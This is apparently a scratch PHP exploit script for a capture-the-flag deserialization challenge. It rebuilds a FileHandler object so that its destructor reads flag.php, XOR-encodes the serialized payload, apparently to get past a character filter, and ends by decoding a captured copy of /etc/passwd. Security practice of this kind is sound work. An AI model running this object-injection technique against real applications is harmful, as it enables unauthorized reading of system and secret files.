<?php
class FileHandler {

    public $op;
    public $filename;
    public $content;

    function __construct() {
        $this->op = 2;
        $this->filename = "flag.php";
        // $this->content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
}

}
$b="";
$c="";
$a=new FileHandler();
$a=serialize($a);
for($i=0;$i<strlen($a);$i++){
    for($j=33;$j<= 125;$j++){
        if(ord($a[$i]^chr($j))>=32 && ord($a[$i]^chr($j))<=125){
            $b.=chr($j);
            $c.=chr(ord($a[$i]^chr($j)));
            break;
        }
    }
}
echo $b."\n";
echo $c."\n";


// echo urlencode($b)."\n";
// echo urlencode($c)."\n";
// echo $b^$c."\n";
echo "\n".$a."\n";
// $d=array( $a );
// echo (string)$d;

$a='O:11:"FileHandler":4:{s:5:"op";N;}';
echo urlencode("!@@@@@!!!!!!!!!!!@@@@!!@@@@!@!!!@@!@!@@@@@!@!!!!!!!!!@@!@!@@@@@!@!!!!!!!!@@!@!^nzqqzbgHMDi@OEMDSbzszZRzuzb!j!NQb{o{Rzqqzb!j!GHMDO@LDb{o{Rzqpzb!j!BNOUDOUb{o{\\");
unserialize("!@@@@@!!!!!!!!!!!@@@@!!@@@@!@!!!@@!@!@@@@@!@!!!!!!!!!@@!@!@@@@@!@!!!!!!!!@@!@!^nzqqzbgHMDi@OEMDSbzszZRzuzb!j!NQb{o{Rzqqzb!j!GHMDO@LDb{o{Rzqpzb!j!BNOUDOUb{o{\\");
// var_dump();
// echo "a"^chr(1);


echo "\n".base64_decode("cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=");